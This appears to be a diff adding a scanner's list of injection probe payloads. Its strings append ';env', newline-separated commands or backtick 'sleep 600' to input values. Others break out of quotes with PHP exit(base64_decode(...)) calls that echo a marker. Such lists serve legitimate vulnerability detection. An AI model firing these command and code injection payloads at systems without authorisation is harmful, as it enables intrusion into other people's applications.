@@ -1,0 +1,20 @@
+;env
+a;env
+a);env
+[VALUE];env
+[VALUE][LF]env
+/e\0
+a;exit(base64_decode('dzRwMXQxX2V2YWw='));//
+a;exit(base64_decode('dzRwMXQxX2V2YWw='));#
+";exit(base64_decode('dzRwMXQxX2V2YWw='));//
+";exit(base64_decode('dzRwMXQxX2V2YWw='));#
+';exit(base64_decode('dzRwMXQxX2V2YWw='));//
+';exit(base64_decode('dzRwMXQxX2V2YWw='));#
+".exit(base64_decode('dzRwMXQxX2V2YWw='));//
+".exit(base64_decode('dzRwMXQxX2V2YWw='));#
+'.exit(base64_decode('dzRwMXQxX2V2YWw='));//
+'.exit(base64_decode('dzRwMXQxX2V2YWw='));#
+exit(base64_decode('dzRwMXQxX2V2YWw='));//
+exit(base64_decode('dzRwMXQxX2V2YWw='));#
+a`)`
+a`sleep 600`
